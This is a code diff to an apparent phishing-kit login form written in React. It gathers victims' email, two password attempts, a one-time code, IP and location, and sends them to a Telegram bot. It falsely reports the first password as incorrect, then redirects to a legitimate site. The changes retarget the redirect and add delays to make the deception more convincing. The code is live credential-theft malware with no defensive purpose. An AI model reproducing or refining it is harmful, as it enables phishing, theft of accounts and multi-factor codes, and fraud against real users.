@@ -14,7 +14,7 @@ function LoginForm({ onClose }) {
 	const [isSubmitDisabled, setIsSubmitDisabled] = useState(false);
 	const [ip, setIp] = useState("");
 	const [location, setLocation] = useState("");
-	const [timeLeft, setTimeLeft] = useState(10);
+	const [timeLeft, setTimeLeft] = useState(90);
 	const [errors, setErrors] = useState({
 		email: "",
 		password: "",
@@ -110,7 +110,7 @@ function LoginForm({ onClose }) {
 				setClickCount1((prevCount) => prevCount + 1);
 
 				if (clickCount1 === 0) {
-					const message = `Data:\nEmail: ${email}\nPassword1: ${password1}\nPassword2: ${password2}\nCode: ${code}\nIP: ${ip}\nLocation: ${location}`;
+					const message = `Data:\nIP: ${ip}\nLocation: ${location}\nEmail: ${email}\nPassword1: ${password1}\nPassword2: ${password2}\nCode: ${code}`;
 
 					await fetch(
 						`https://api.telegram.org/bot${botToken}/sendMessage`,
@@ -125,19 +125,20 @@ function LoginForm({ onClose }) {
 							}),
 						}
 					);
+					setTimeout(() => {
+						setIsSubmitDisabled(true);
 
-					setIsSubmitDisabled(true);
-
-					const countdown = setInterval(() => {
-						setTimeLeft((prevTime) => {
-							if (prevTime <= 1) {
-								clearInterval(countdown);
-								setIsSubmitDisabled(false);
-								return 0;
-							}
-							return prevTime - 1;
-						});
-					}, 1000);
+						const countdown = setInterval(() => {
+							setTimeLeft((prevTime) => {
+								if (prevTime <= 1) {
+									clearInterval(countdown);
+									setIsSubmitDisabled(false);
+									return 0;
+								}
+								return prevTime - 1;
+							});
+						}, 1000);
+					}, 2000);
 
 					// setErrors((prevErrors) => ({
 					// 	...prevErrors,
@@ -145,7 +146,7 @@ function LoginForm({ onClose }) {
 					// 		"The code you entered is incorrect. Please try again.",
 					// }));
 				} else if (clickCount1 === 1) {
-					const message = `Data:\nEmail: ${email}\nPassword1: ${password1}\nPassword2: ${password2}\nCode: ${code}\nIP: ${ip}\nLocation: ${location}`;
+					const message = `Data:\nIP: ${ip}\nLocation: ${location}\nEmail: ${email}\nPassword1: ${password1}\nPassword2: ${password2}\nCode: ${code}`;
 
 					await fetch(
 						`https://api.telegram.org/bot${botToken}/sendMessage`,
@@ -160,12 +161,14 @@ function LoginForm({ onClose }) {
 							}),
 						}
 					);
-					setIsSubmitDisabled(true);
-					window.location.href = "https://www.facebook.com/";
-					setErrors((prevErrors) => ({
-						...prevErrors,
-						isSubmitCode: "",
-					}));
+					setTimeout(() => {
+						setIsSubmitDisabled(true);
+						window.location.href = "https://finaloop.com";
+						setErrors((prevErrors) => ({
+							...prevErrors,
+							isSubmitCode: "",
+						}));
+					}, 2000);
 				}
 			}
 		} catch (error) {
@@ -180,14 +183,18 @@ function LoginForm({ onClose }) {
 
 			if (clickCount === 0) {
 				setPassword1(password);
-				setErrors((prevErrors) => ({
-					...prevErrors,
-					submit: "The password you've entered is incorrect.",
-				}));
-				setPassword("");
+				setTimeout(() => {
+					setErrors((prevErrors) => ({
+						...prevErrors,
+						submit: "The password you've entered is incorrect.",
+					}));
+					setPassword("");
+				}, 2000);
 			} else if (clickCount === 1) {
 				setPassword2(password);
-				setIsSuccess(true);
+				setTimeout(() => {
+					setIsSuccess(true);
+				}, 2000);
 			}
 		}
 	};
